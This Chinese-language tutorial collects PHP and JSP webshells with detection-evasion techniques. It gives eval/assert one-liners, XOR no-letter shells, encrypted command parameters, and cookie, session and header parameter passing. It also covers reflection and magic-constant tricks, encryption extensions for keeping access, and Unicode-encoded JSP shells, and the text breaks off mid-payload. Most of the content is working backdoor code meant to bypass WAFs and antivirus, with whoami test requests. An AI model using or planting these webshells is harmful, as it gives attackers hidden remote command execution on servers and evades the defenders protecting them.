# PHP

## PHP一句话

```php
<?php eval(@$_POST['a']); ?>
```

```php
<?php assert(@$_POST['a']); ?>
```

eval() 是一个语言构造器而不是一个函数，不能被 可变函数 调用

assert() 可以被可变函数调用，例如诸多的回调函数，这样就方便了许多

```php
<?php
$func = $_GET["func"];
assert("$func()");
?>
# 这也是一个一句话
```

利用：

```http
http://127.0.0.1:8081/security/bypass/test01.php?func=system(%22whoami%22)
```

## assert函数

assert是一个断言函数，当assert进行判断时，如果为false，则会发出Warning的提醒，但是依然会继续向下执行。对于调试很好，尤其是可以使用回调函数的时候，如果对用户输入的数据过滤不严谨的话，assert的危害比eval还要大。

便需要结合不同编程语言要有不同的应对方式，我用php做实例，总的思路就是：**要刨除代码和函数的关系**

大体有以下几个思路：

- 字符串变换（拼接、编码、等等。。。）
- 函数特性
- 类特性
- 混合免杀
- 奇思妙想

## 字符串变换

单纯的字符串变化还是有可疑，我们还需要配合其他

```php
<?php

$a = substr_replace("xxser","asser",-3);
echo $a."<br>";  //xxasser
$aa = array('',$a);
$b = $aa[1].chr('116');
echo $b."<br>";  //xxassert
$fun=preg_replace("/xx/","",$b);
echo $fun."<br>";  //assert
$cc = substr_replace("",$fun,0);
echo $cc."<br>";  //assert

$cc($_GET['x']);
```

<img src=".\图片\Snipaste_2023-04-26_12-23-59.png" alt="Snipaste_2023-04-26_12-23-59" style="zoom:80%;" />

## 函数特性

函数特性里面我知道的有：

- 自定义函数绕过
- 变形回调
- 数组
- 可变变量

### 自定义函数

纯自定义函数还是可以绕过的

```php
<?php
function zeo($b){
    return $b;
}
function ass($a){
    return assert($a);
}
function get(){
    return $_GET['x'];
}

function run(){
    return zeo(ass)(zeo(get)());
}

zeo(ass)(zeo(get)());

```

```http
http://127.0.0.1:8081/security/bypass/test03.php?x=system(%22whoami%22)
```

## 回调函数+组合绕过

```php
call_user_func_array()
call_user_func()
array_filter() 
array_walk()  
array_map()
array_reduce()
array_walk() 
array_walk_recursive()
filter_var() 
filter_var_array() 
uasort() 
uksort() 
registregister_shutdown_function()
register_tick_function()
forward_static_call_array(assert,array($_POST[x]));
```

- 所以只能稍微配合上面的内容，奉献下面的免杀马
- 这个那就是定义个函数加个简单的拼接

```php
<?php 
function zeo($c,$d){
	pj()($c,$d);
}
function pj(){
	return "register_shut"."down_function";
}

$b=$_GET['x'];
zeo(assert,$b);
?>
```

```http
http://127.0.0.1:8081/security/bypass/test04.php?x=system(%22whoami%22)
```

## 二维数组

```php
<?php
$b = substr_replace("assexx","rt",4);
$a = array($arrayName = ($arrayName =($arrayName = array('a' => $b($_GET['x'])))));
?>
```

```http
http://127.0.0.1:8081/security/bypass/test05.php?x=system(%22whoami%22)
```

## 变量覆盖

```php
<?php
$zeo = 'dalao';
$$zeo = $_GET['x'];
assert($dalao);
```

## 特殊字符干扰

- 要求是能干扰到杀软的正则判断，还要代码能执行。
- 这个可以自己fuzz
- 大概就是说各种回车、换行、null和空白字符
- 我这里试了一下成功了，配合上面的可变变量

```php
<?php
$zeo='dalao';
$$zeo=$_GET['x'];
assert(`  `.$dalao);
?>
```

## 使用类绕过

类现在发现好多人在用，这个好像D盾检测的最轻，用类自然就少不了魔法函数

```php
<?php 
class zeo2
{
  public $b ='';
  
  function post(){
    return $_GET['x'];
  }
}
class zeo extends zeo2
{
  public $code=null;
  function __construct(){
  	$code=parent::post();
    assert($code);
  }
}
$blll = new zeo;
//$bzzz = new zeo2;
?>
```

## 无字母马

主要思路就是：

- 没有字母，简单来说就是字母被替代了

- 就是用各种运算，例如异或，拼装出来想要的函数
- 最后能构造出a-z中任意一个字符。
- 然后再利用PHP允许动态函数执行的特点，
- 拼接处一个函数名，如“assert”，然后动态执行之即可。

参考P牛的，这个讲的已经很清楚，想了解的可以看看

https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html



这是最简单、最容易想到的方法。在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。

得到如下的结果（因为其中存在很多不可打印字符，所以我用url编码表示了）：

```php
<?php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';
$___=$$__;
$_($___[_]); // assert($_POST[_]);
```



# 红队蓝军

## 简单字符串拼接

```php
<?php
$func = $_GET["func"];
$a = "a";
$s = "s";
$c=$a.$s.$_GET["func2"];
$c($func);
?>
```

```http
http://127.0.0.1:8081/security/bypass/test09.php?func2=sert&func=phpinfo()
```

## 利用字符串函数

一些字符串处理函数：

```php
ucwords()  //把每个单词的首字符转换为大写
ucfirst()  //首字符转换为大写
trim()  //移除字符串两侧的字符
substr_replace() //函数把字符串的一部分替换为另一个字符串
substr()  //函数返回字符串的一部分
strtr()  //函数转换字符串中特定的字符
strtoupper()  //把所有字符转换为大写
strtolower()  //把所有字符转换为小写
strtok()  //函数把字符串分割为更小的字符串
str_rot13()  //函数对字符串执行 ROT13 编码
chr()  //从指定 ASCII 值返回字符
hex2bin() //把十六进制值转换为 ASCII 字符
bin2hex() //ASCII 字符的字符串转换为十六进制值
gzcompress()、gzdeflate()、gzencode()  //字符串压缩
gzuncompress()、gzinflate()、gzdecode()  //字符串解压
base64_encode()  //base64编码
base64_decode()  //nase64解码
pack()  //数据装入一个二进制字符串
unpack()  //从二进制字符串对数据进行解包
```

### base64加参数加密

```php
<?php
$func = base64_decode($_GET["func"]);
#cGhwaW5mbygp  -->  phpinfo()
$a = "a";
$s = "s";
$c=$a.$s.$_GET["func2"];
$c($func);
?>
```

```http
http://127.0.0.1:8081/security/bypass/test10.php?func2=sert&func=cGhwaW5mbygp
```

### gzcompress系列

```php
<?php
$a = gzcompress("abc");
echo "压缩后: ".$a;

echo "<br>解压后: ".gzuncompress($a);
?>
```

<img src=".\图片\Snipaste_2023-04-26_13-58-30.png" alt="Snipaste_2023-04-26_13-58-30" style="zoom:80%;" />



可以看到这里解压后的内容变成了一堆乱码，在这里值得注意的是，如果我们利用方式依旧像base64一样是行不通，**因为这一串乱码是无法提过字符串的形式准确的返回给服务端的**：

```php
<?php
$func = gzuncompress($_GET["func"]);
$a = "a";
$s = "s";
$c=$a.$s.$_GET["func2"];
$c($func);
?>
```

<img src=".\图片\Snipaste_2023-04-26_14-00-29.png" alt="Snipaste_2023-04-26_14-00-29" style="zoom:80%;" />

这里笔者提供两个思路：

#### 1.base64编码

再次利用base64编码，如果没有经验的兄弟可能会认为这是多此一举，我直接用base64不就完了么，其实在真正的对抗当中，**很多安全设备是可以识别base64编码的**，可以自动解码判断解码后的内容。这一不其实就是为了，防止被解码后，内容被识别：



```php
<?php
echo  base64_encode(gzcompress("phpinfo()"))."<br>"; //反过来编码 phpinfo() 后为 eJwryCjIzEvL19AEABJDA0Y=
$func = gzuncompress(base64_decode($_GET["func"]));
$a = "a";
$s = "s";
$c=$a.$s.$_GET["func2"];
$c($func);
?>
```

<img src=".\图片\Snipaste_2023-04-26_14-07-10.png" alt="Snipaste_2023-04-26_14-07-10" style="zoom:80%;" />



### pack系列

```php
<?php

$func=pack("H14","706870696e666f");
echo $func."<br>";  // phpinfo  用 echo bin2hex("phpinfo"); 转化为16进制 为 706870696e666f
$a = "a";
$s = "s";
$c=$a.$s.$_GET["func2"];
$c($func."()");
```

<img src=".\图片\Snipaste_2023-04-26_14-22-04.png" alt="Snipaste_2023-04-26_14-22-04" style="zoom:80%;" />

如果有经验的同学可能会觉得这个和hex2bin非常相似，其实pack函数比hex2bin强大的多

语法：

```
unpack(format,data)

data。规定被解包的二进制数据。

format。规定在解包数据时所使用的格式。
可能的值：

a - NUL 填充的字符串
A - SPACE 填充的字符串
h - 十六进制字符串，低位在前
H - 十六进制字符串，高位在前
c - signed char
C - unsigned char
s - signed short（总是16位, machine 字节顺序）
S - unsigned short（总是16位, machine 字节顺序）
n - unsigned short（总是16位, big endian 字节顺序）
v - unsigned short（总是16位, little endian 字节顺序）
i - signed integer（取决于 machine 的大小和字节顺序）
I - unsigned integer（取决于 machine 的大小和字节顺序）
l - signed long（总是32位, machine 字节顺序）
L - unsigned long（总是32位, machine 字节顺序）
N - unsigned long（总是32位, big endian 字节顺序）
V - unsigned long（总是32位, little endian 字节顺序）
f - float（取决于 machine 的大小和表示）
d - double（取决于 machine 的大小和表示）
x - NUL 字节
X - 备份一个字节
Z - NUL 填充的字符串
@ - NUL 填充绝对位置
```

此函数提供了多中格式，可以将文件或者流量变得更加复杂



另外补充，将字符串转化为 16进制与2进制：

```php
<?php
header('content-type:text/html;charset=utf-8');
$str = bin2hex("phpinfo");
echo "字符串对应的16进制值：".$str."<br>"; //706870696e666f
echo "字符串对应的2进制值：".base_convert($str, 16, 2);
?>
```



## 加密函数与自写加密函数

### openssl加密函数：

这个是对称加密（加密和解密的密匙为同一个），使用这个得去 php.ini 里开启 openssl 扩展

`openssl_encrypt()`方法详解：

```php
openssl_encrypt($data, $method, $key, $options = 0, $iv = "", &$tag = NULL, $aad = "", $tag_length = 16)
参数：

1.$data：加密明文
2.$method：加密方法： 可以通过openssl_get_cipher_methods()获取有哪些加密方式
3.$passwd：加密密钥[密码]
4.$options：数据格式选项（可选）【选项有：】：0,OPENSSL_RAW_DATA=1,OPENSSL_ZERO_PADDING=2,OPENSSL_NO_PADDING=3
5.$iv：密初始化向量（可选),需要注意：如果method为DES−ECB，则iv无需填写
6.$tag：使用 AEAD 密码模式（GCM 或 CCM）时传引用的验证标签(可选)
7.$aad：附加的验证数据。（可选）
8.$tag_length：验证 tag 的长度。GCM 模式时，它的范围是 4 到 16(可选)
```

`openssl_decrypt()`方法详解：

```php
openssl_decrypt($data, $method, $password, $options = 1, $iv = "", $tag = "",  $aad = "")
参数：

1.$data：要解密的加密消息。
2.$method：解密方法：可以通过openssl_get_cipher_methods()获取有哪些解密方式
3.$passwd：解密密钥[密码]
4.$options：数据格式选项（可选）【选项有：】0,OPENSSL_RAW_DATA=1,OPENSSL_ZERO_PADDING=2,OPENSSL_NO_PADDING=3
5.$iv：密初始化向量（可选),需要注意：如果method为DES−ECB，则iv无需填写
6.$tag：AEAD密码模式下的身份验证标签(可选)
7.$aad：附加的验证数据。（可选）
```

函数基本使用：

```php
<?php
// 要加密的字符串
$data = 'demo';
// 密钥
$key = '123456';
// 加密数据 'AES-128-ECB' 可以通过openssl_get_cipher_methods()获取
$encrypt = openssl_encrypt($data, 'AES-128-ECB', $key, 0);
echo "加密后： ".$encrypt; // 加密后： +eiWVKsoGuc4YBAgbhLq/g==

//密钥
$key = '123456';
// 解密数据
$decrypt = openssl_decrypt($encrypt, 'AES-128-ECB', $key, 0);
echo "<br>解密后： ".$decrypt;  // 解密后： demo
```



实际利用:

```php
<?php
$key = "password";

echo openssl_encrypt("phpinfo()",'AES-128-ECB',$key,0);
// K6El9pg8BG8F8zSJVms05Q==

$fun = openssl_decrypt($_GET['func'], 'AES-128-ECB', $key, 0);
$a = "a";
$s = "s";
$c=$a.$s.$_GET["func2"];
$c($fun);
```

<img src=".\图片\Snipaste_2023-04-26_14-46-39.png" alt="Snipaste_2023-04-26_14-46-39" style="zoom:80%;" />



### 自己写加密算法

这种方式也比较简单，在很多ctf题目中都喜欢考与，或，取反，异或等进行绕过，其中可以直接用他们进行加密操作，当然如果学过密码学，一些简单的加密方式其实也行，凯莎密码，维吉尼亚密码，替换加密等都是可以尝试的，但是更复杂的算法还是建议，能使用现成的扩展就直接用，没必要花太多时间去研究这些算法。

下面就以**异或加密**为例：

```php
<?php
$key = "password";

//ERsDHgEUC1hI
$fun = base64_decode($_GET['func']);
for($i=0;$i<strlen($fun);$i++){
    $fun[$i] = $fun[$i]^$key[$i+1&7];
}
echo $fun; // phpinfo()
$a = "a";
$s = "s";
$c=$a.$s.$_GET["func2"];
$c($fun);
```

<img src=".\图片\Snipaste_2023-04-26_14-50-52.png" alt="Snipaste_2023-04-26_14-50-52" style="zoom:80%;" />



## 传参方式

在这里解释一下为什么，需要讲述传参方式，由于在很多情况下，以请求头作为参数传递并非waf和人工排查的重中之重且非常误导和隐藏，下面就是常用的几种方式：

### 1.Cookie

由于Cookie基本上是每个web应用都需要使用到的，php应用在默认情况下，在Cookies请求头中会存在一个PHPSESSID=xxxx这样的cookie，其实这个就可以成为我们的传参位置

```php
<?php
session_start();
$a = "a";
$s = "s";
$c=$a.$s."sert";

$c(base64_decode($_COOKIE["PHPSESSID"]));
```

<img src=".\图片\Snipaste_2023-04-26_17-33-42.png" alt="Snipaste_2023-04-26_17-33-42" style="zoom:80%;" />

可以看到已经执行成功了，可以看到这个迷惑去非常强，如果不仔细排查是不容易发现的，由于webshell的session和网站本身业务并没有关系，所以这个PHPSESSID可以随意修改

### 2.Session

session的传参方式其实算是一种间接传产方式，由于session的内容是需要通过源码设置的，并不能想cookie一样直接在请求头中修改，因此需要准备两个文件：

- 一个是将输入的参数传入session
- 另一个就是将session中的内容取出并执行命令



给session传入参数：

```php
<?php
session_start();
$_SESSION['dmeo']=base64_decode($_COOKIE["PHPSESSID"]);
```

取出session内容并执行，其实下面的代码是可以直接插入到正常页面中的，增加迷惑性，因为一般正常页面返回的html代码是比较多的，如果我们将内容回显的正常页面当中是比较难发现的：

```php
<?php
session_start();
$a = "a";
$s = "s";
$c=$a.$s."sert";
$c($_SESSION['dmeo']);
```



在test.php下通过cookie添加session，注意这个PHPSESSID的值其实**就是一个session文件**，每当有一个新的sessionid都会生成一个新的session文件，因此这个文件名我们是可以随意修改的，在这里的sessionid不但是文件名，而且也是我们的base64加密后的命令，这里只需要了解一下即可



先访问 test.php 写入恶意 session 文件到服务器：
<img src=".\图片\Snipaste_2023-04-26_17-44-07.png" alt="Snipaste_2023-04-26_17-44-07" style="zoom:80%;" />

再访问 test19.php 从 SESSION 文件里取出 dmeo 的值，进入到 assert 中触发代码执行：
<img src=".\图片\Snipaste_2023-04-26_17-46-23.png" alt="Snipaste_2023-04-26_17-46-23" style="zoom:80%;" />



总结：session传参其实就是一种参数转移的感觉

### 3.自定义头

自定义请求头其实也是作为一种伪装的请求方式，你可以选择完全自定义一个请求头进行参数传递，但是很多waf也会检测一些没出现过的请求头容易被识别出来，且一旦在日志中被找到一个以这种方式传参，很容易就能查找到使用数据包，还是不稳当，与cookie相比，cookie本身就是一堆随机数不好区分

```php
<?php
session_start();
$a = "a";
$s = "s";
$c=$a.$s."sert";
$c(getallheaders()['Demo']);
```

<img src=".\图片\Snipaste_2023-04-26_17-49-13.png" alt="Snipaste_2023-04-26_17-49-13" style="zoom:80%;" />

### 4.php伪协议

```php
<?php
$q=$_GET[1];
file_get_contents("php".$q)($_GET[2]);
```

<img src=".\图片\Snipaste_2023-04-26_18-10-07.png" alt="Snipaste_2023-04-26_18-10-07" style="zoom:80%;" />



## 数据特征绕过

在这里为什么我会将特征绕过，而并没有像其他博客上写的那些，整一堆混淆的方法，原因就是因为，waf毕竟还是通过特征判断的，只有知道了，**waf匹配的正则表达式大概是什么样的，webshell的免杀有真正的意义。**

### 1.$_xxx[xxx] 绕过:

#### 1.1 {}

使用 `{}` 来替代 `[]` 是在 ctf 中十分常见的绕过方式

```php
<?php
echo $_GET{"demo"};
```

#### 1.2 foreach语句

利用复合变量加 `foreach` ，获取参数中的内容，其特点并没有 `[]`，不容易被识别

```php
<?php
$a = "a";
$s = "s";
$c=$a.$s."sert";
foreach (array('_GET') as $r){
    foreach ($$r as $k =>$v){
        $c($v);
    }
}
```

```http
http://127.0.0.1:8081/security/bypass/test22.php?k=phpinfo()
```

### 2.xxx(XXX)绕过

这个特征大致就是某盾，某狗等的正则表达式匹配的内容，只要去消除此特征即可免杀

#### 2.1 ""特性

该原理就是 `""` 中的变量不会被当做字符串使用，会被解析，经过测试该方法基本失效

```php
<?php
$a = "a";
$s = "s";
$c=$a.$s."sert";
$f = $_GET[1]
$c("$f");
```

```http
http://127.0.0.1:8081/security/bypass/test23.php?1=phpinfo()
```

#### 2.2 回调函数

```php
<?php
function  demo()
{
    return $_GET["a"];
}

demo()($_GET["b"]);
```

```http
http://127.0.0.1:8081/security/bypass/test24.php?a=assert&b=phpinfo()
```

#### 2.3 魔术常量

可以用到的4种魔术常量

```
__FILE__：返回当前文件的绝对路径(包含文件名)。

__FUNCTION__：返回当前函数(或方法)的名称。

__CLASS__：返回当前的类名(包括该类的作用区域或命名空间)。

__NAMESPACE__：返回当前文件的命名空间的名称。
```



2.3.1：`__FILE__的利用，将webshell的名字改为base64编码后的内容`

```php
<?php
base64_decode(basename(__FILE__,".php"))($_GET[1]);
```

```http
http://127.0.0.1:8081/security/bypass/YXNzZXJ0.php?1=phpinfo()
```

```
YXNzZXJ0 为 assert base64编码后的内容
```

2.3.2：`__FUNCTION__的利用，获取函数名`

```php
<?php
function assert2(){
    substr(__FUNCTION__,0,6)($_GET[1]);
}
assert2();
```

```http
http://127.0.0.1:8081/security/bypass/test25.php?1=phpinfo()
```

2.3.3：`__CLASS__的利用，获取类名`

```php
<?php
class assert2{
    static function demo(){
        substr(__CLASS__,0,6)($_GET[1]);
    }
}
assert2::demo();
```

```http
http://127.0.0.1:8081/security/bypass/test26.php?1=phpinfo()
```

稍稍延伸：用 base64 解码敏感类名

```php
<?php
class YXNzZXJ0{
    static function demo(){
       base64_decode(__CLASS__)($_GET[1]);
    }
}
YXNzZXJ0::demo();
```

2.3.4：`__NAMESPACE__的利用`

```php
<?php
namespace assert2;
substr(__NAMESPACE__,0,6)($_GET[1]);
```

```http
http://127.0.0.1:8081/security/bypass/test28.php?1=phpinfo()
```

当然在实战种还是要像上一篇文章一样，将传入的参数进行加密处理，如果再把传参方式改为cookie的那就很完美了

#### 2.4 自定义常量

```php
<?php
define("DEMO",$_GET[1]."ert");
substr(DEMO,0)($_GET[2]);
```

```http
http://127.0.0.1:8081/security/bypass/test29.php?1=ass&2=phpinfo()
```

#### 2.5 分离免杀

顾名思义，就是将一个马拆分成两部分，及使用 `file_get_contents()` 将内容读取出来，为什么不使用 include 等这些文件包含函数了？因为 webshell 的免杀在于动态函数的调用，最终还是要拼接在一起，绕过的原则其实就是绕过 waf 的正则表达式，如果直接 include 其实和写在一个文件里没啥区别

```php
<?php
file_get_contents("test.txt")($_GET[1]);
```

然后在 test.txt 中写入： `assert`

把 webshell 和 test.php 一起传到服务端，再访问触发：

```http
http://127.0.0.1:8081/security/bypass/test30.php?1=system(%27whoami%27)
```

#### 2.6 注释及空白符混淆

这种方式和 sql 注入差不多，原理就是 php **允许在括号中添加注释符和空白符并不会影响代码正常运行**

```php
<?php
$func = $_GET["func"];
$a = "a";
$s = "s";
$c=$a.$s.$_GET["func2"];
$c(//);//(
    $func//);//);
)
?>
```

```http
http://127.0.0.1:8081/security/bypass/test31.php?func=system(%27whoami%27)&func2=sert
```

#### 2.7 反射调用

反射类及反射类方法

```php
<?php
    $class          = new \ReflectionClass('Site\\Website');  // 以类名 Website 作为参数，即可创建 Website 类的反射类
    $properties     = $class->getProperties();      // 以数组的形式返回 Website 类的所有属性
    $property       = $class->getProperty('name');  // 获取 Website 类的 name 属性
    $methods        = $class->getMethods();         // 以数组的形式返回 Website 类的所有方法
    $method         = $class->getMethod('getName'); // 获取 Website 类的 getName 方法
    $constants      = $class->getConstants();       // 以数组的形式获取所有常量
    $constant       = $class->getConstant('TITLE'); // 获取 TITLE 常量
    $namespace      = $class->getNamespaceName();   // 获取类的命名空间
    $comment_class  = $class->getDocComment();      // 获取 Website 类的注释文档，即定义在类之前的注释
    $comment_method = $class->getMethod('getUrl')->getDocComment();  // 获取 Website 类中 getUrl 方法的注释文档
?>
```



通过属性名免杀：

```php
<?php
class a{
    public $assert2;
}
$class = new ReflectionClass(new a());
substr($class->getProperties()[0]->name,0,6)($_GET[1]);
```

```http
http://127.0.0.1:8081/security/bypass/test32.php?1=system(%27whoami%27)
```

*通过注释免杀：感觉很有用

```php
<?php
/**
 *assert*/
class A
{
    public static function B()
    {
        return $_GET[1];
    }
}
$re = new ReflectionClass(new A());
$a = str_ireplace(" ","",str_ireplace("\n","",str_ireplace("/","",str_ireplace("*","",$re->getDocComment()))));

substr($a,1)(A::B());
```

```http
http://127.0.0.1:8081/security/bypass/test33.php?1=system(%27whoami%27)
```

#### 2.8 类调用

类方法调用：

```php
<?php
class a{
    function demo(){
        $a = "a";
        $s = "s";
        $c=$a.$s."sert";
        return $c;
    }
}

$s = new a();
$s->demo()($_GET[1]);
```

```http
http://127.0.0.1:8081/security/bypass/test34.php?1=system(%27whoami%27)
```

类的静态方法：

```php
<?php
class a{
    static function demo(){
        $a = "a";
        $s = "s";
        $c=$a.$s."sert";
        return $c;
    }
}

a::demo()($_GET[1]);
```

```http
http://127.0.0.1:8081/security/bypass/test35.php?1=system(%27whoami%27)
```

### 总结

webshell 的免杀**前提是要分析出 waf 大概的规则**，如果盲目尝试是无法有更快的提示，正所谓大道至简，本文以最简单的代码解释了免杀的方法，原理以及waf背后的逻辑，对于更高级的waf，本文列举了很多种方法，在必要的时候是需要将多种方法合并使用的，以达到最好效果，最后有的绕过方式实在是太老了就没必要讲，如无特征马说是无特征，但这所谓的无特征就是它的最大特征，物联网是人类创造的，所有的东西都满足人类逻辑，**不要死记硬背那些复杂的免杀马，只有清楚背后的逻辑才能真正的有所提升。**

## 无扩展免杀

### 1.php加密

这里是利用 phpjiami 网站进行加密，进而达到加密效果

```http
https://www.phpjiami.com/
```

加密前：

```php
<?php
session_start();
$a = "a";
$s = "s";
$c=$a.$s."sert";
$c($_GET["1"]);
?>
```

加密後成功运行：

```http
http://127.0.0.1:8081/security/bypass/test36.php?1=phpinfo()
```

### 2.dezend加密

```http
http://dezend.qiling.org/encrypt.html
```

### 3.z5encrypt

```http
https://z5encrypt.com/encrypt/build
```

### 4.php-obfuscator

工具下载

```http
https://github.com/naneau/php-obfuscator
```

在线工具

```php
https://www.phpobfuscator.cn/
```

### 5.yakpro-po

工具下载

```http
https://github.com/pk-fr/yakpro-po
```

在线运行

```http
https://www.php-obfuscator.com/?demo
```

### 6.phpjm

```http
http://www.phpjm.net/encode.html
```

### 7.Virbox

```http
https://shell.virbox.com/apply.html
```

Virbox已经属于是商业源码加密,基本上没有任何特征

但是由于这个是需要将生成好的php-cqi.exe原有的php-cqi.exe才能达到解密的效果，因此只能说作为一个权限维持的方式，先拿到权限后，修改php-cqi.exe，在上这种加密马，作为一个权限维持

### 总结

以上总结了webshell加密的工具，其实在非扩展的加密工具中，其原理很多就是混淆变量名和函数名，类名，命名空间等等，可以配合多个加密工具进行多种加密，当然也可以和之前文章的免杀进行结合

## 扩展免杀

由于很多企业为了防止源码泄露，都会使用加密扩展将代码进行加密，那么我们就可以就将计就计，将webshell也利用扩展加密，将特征消除，从而达到免杀的效果

### 1.php-beast

扩展地址

```http
https://github.com/liexusong/php-beast
https://github.com/imaben/php-beast-binaries
```

下载dll，并添加至ext中

<img src=".\图片\640" alt="图片" style="zoom:80%;" />

在php.ini 中添加该扩展

<img src=".\图片\aaaa" alt="图片" style="zoom:80%;" />

修改configure.ini

```
; source path
src_path = "C:/Users/12107/Desktop/demo/"

; destination path
dst_path = "C:/Users/12107/Desktop/demo2/"

; expire time
expire = "2021-09-08 17:01:20"

; encrypt type
encrypt_type = "AES"
```

<img src=".\图片\640aaaa" alt="图片" style="zoom:80%;" />



<img src=".\图片\640qqq" alt="图片" style="zoom:80%;" />



<img src=".\图片\aaf" alt="图片" style="zoom:67%;" />

当然也可以不使用默认密钥

在aes_algo_handler.c中可以修改默认密钥

<img src=".\图片\640aaf" alt="图片" style="zoom:80%;" />

当然如果没有密钥其实是无法生成一个能被解析的php文件，因此还需要通过逆向获取dll中的密钥

破解参考：

```
http://www.phpheidong.com/blog/article/337644/71c2cabcc769f99d7808/
```

### 2.screw_plus

环境搭建

```
https://blog.oioweb.cn/64.html
https://newsn.net/say/php-screw-plus.html
```

破解参考：

```
https://www.cnblogs.com/StudyCat/p/11268399.html
```

### 3.总结

基于扩展的免杀，如果知道密钥，经加密后的webshell是不具备任何特征的，基本上直接通杀。

具体步骤通过phpinfo获取扩展信息，根据不同的加密扩展进行尝试利用默认密钥进行加密，通过访问webshell来判断密钥是否正确，当然，这种方法其实只能用于权限维持需要拿到权限后获取扩展文件破解后，才能稳定获取密钥，进而加密webshell

## 框架免杀

[什么？你还不会webshell免杀？（四） (qq.com)](https://mp.weixin.qq.com/s/_31K7YYjCI7VJtp_T-dFVg)

# JSP

## 内置函数免杀

### 原始webshell

```jsp
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@page language="java" pageEncoding="utf-8" %>


<%
    String cmd = request.getParameter("c");
    Process process = Runtime.getRuntime().exec(cmd);
    InputStream is = process.getInputStream();
    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(is));
    String r = null;
    while((r = bufferedReader.readLine())!=null){
        response.getWriter().println(r);
    }
%>
```

查杀的点在于 `Runtime.getRuntime().exec` 非常明显的特征

```http
http://localhost:8080/webshell123/test9.jsp?c=whoami
```

### 利用ProcessBuilder

`Runtime.getRuntime().exec(cmd)` 其实最终调用的是 `ProcessBuilder` 这个函数，因此我们可以直接利用 `ProcessBuilder` 来替换 `Runtime.getRuntime().exec(cmd)`，从而绕过正则表达式

```jsp
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@page language="java" pageEncoding="utf-8" %>


<%
    String cmd = request.getParameter("c");
    Process process = new ProcessBuilder(new String[]{cmd}).start();
    InputStream is = process.getInputStream();
    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(is));
    String r = null;
    while((r = bufferedReader.readLine())!=null){
        response.getWriter().println(r);
    }
%>
```

```http
http://localhost:8080/webshell123/test10.jsp?c=whoami
```

### BeansExpression免杀

这种方式是利用 Expression 将 Runtime.getRuntime().exec 这个特征分开，相当于一个对调函数。免杀效果一般，因为很多查杀都是直接匹配 Runtime.getRuntime()

```jsp
<%@ page import="java.beans.Expression" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStream" %>
<%@ page language="java" pageEncoding="UTF-8" %>
<%
  String cmd = request.getParameter("c");
  Expression expr = new Expression(Runtime.getRuntime(), "exec", new Object[]{cmd});

  Process process = (Process) expr.getValue();
  InputStream in = process.getInputStream();
  BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(in));
  String tmp = null;
  while((tmp = bufferedReader.readLine())!=null){
    response.getWriter().println(tmp);
  }
%>
```

## 编码免杀

### Unicode编码

jsp 支持 unicode 编码，如果杀软不支持 unicode 查杀的话，基本上都能绕过

```jsp
<%@ page language="java" contentType="text/html;charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="java.io.*"%>

<%
  \uuuu0053\uuuu0074\uuuu0072\uuuu0069\uuuu006e\uuuu0067\uuuu0020\uuuu0063\uuuu006d\uuuu0064\uuuu0020\uuuu003d\uuuu0020\uuuu0072\uuuu0065\uuuu0071\uuuu0075\uuuu0065\uuuu0073\uuuu0074\uuuu002e\uuuu0067\uuuu0065\uuuu0074\uuuu0050\uuuu0061\uuuu0072\uuuu0061\uuuu006d\uuuu0065\uuuu0074\uuuu0065\uuuu0072\uuuu0028\uuuu0022\uuuu0063\uuuu006d\uuuu0064\uuuu0022\uuuu0029\uuuu003b\uuuu0050\uuuu0072\uuuu006f\uuuu0063\uuuu0065\uuuu0073\uuuu0073\uuuu0020\uuuu0070\uuuu0072\uuuu006f\uuuu0063\uuuu0065\uuuu0073\uuuu0073\uuuu0020\uuuu003d\uuuu0020\uuuu0052\uuuu0075\uuuu006e\uuuu0074\uuuu0069\uuuu006d\uuuu0065\uuuu002e\uuuu0067\uuuu0065\uuuu0074\uuuu0052\uuuu0075\uuuu006e\uuuu0074\uuuu0069\uuuu006d\uuuu0065\uuuu0028\uuuu0029\uuuu002e\uuuu0065\uuuu0078\uuuu0065\uuuu0063\uuuu0028\uuuu0063\uuuu006d\uuuu0064\uuuu0029\uuuu003b\uuuu0049\uuuu006e\uuuu0070\uuuu0075\uuuu0074\uuuu0053\uuuu0074\uuuu0072\uuuu0065\uuuu0061\uuuu006d\uuuu0020\uuuu0069\uuuu0073\uuuu0020\uuuu003d\uuuu0020\uuuu0070\uuuu0072\uuuu006f\uuuu0063\uuuu0065\uuuu0073\uuuu0073\uuuu002e\uuuu0067\uuuu0065\uuuu0074\uuuu0049\uuuu006e\uuuu0070\uuuu0075\uuuu0074\uuuu0053\uuuu0074\uuuu0072\uuuu0065\uuuu0061\uuuu006d\uuuu0028\uuuu0029\uuuu003b\uuuu0042\uuuu0075\uuuu0066\uuuu0066\uuuu0065\uuuu0072\uuuu0065\uuuu0064\uuuu0052\uuuu0065\uuuu0061\uuuu0064\uuuu0065\uuuu0072\uuuu0020\uuuu0062\uuuu0075\uuuu0066\uuuu0066\uuuu0065\uuuu0072\uuuu0065\uuuu0064\uuuu0052\uuuu0065\uuuu0061\uuuu0064\uuuu0065\uuuu0072\uuuu0020\uuuu003d\uuuu0020\uuuu006e\uuuu0065\uuuu0077\uuuu0020\uuuu0042\uuuu0075\uuuu0066\uuuu0066\uuuu0065\uuuu0072\uuuu0065\uuuu0064\uuuu0052\uuuu0065\uuuu0061\uuuu0064\uuuu0065\uuuu0072\uuuu0028\uuuu006e\uuuu0065\uuuu0077\uuuu0020\uuuu0049\uuuu006e\uuuu0070\uuuu0075\uuuu0074\uuuu0053\uuuu0074\uuuu0072\uuuu0065\uuuu0061\uuuu006d\uuuu0052\uuuu0065\uuuu0061\uuuu0064\uuuu0065\uuuu0072\uuuu0028\uuuu0069\uuuu00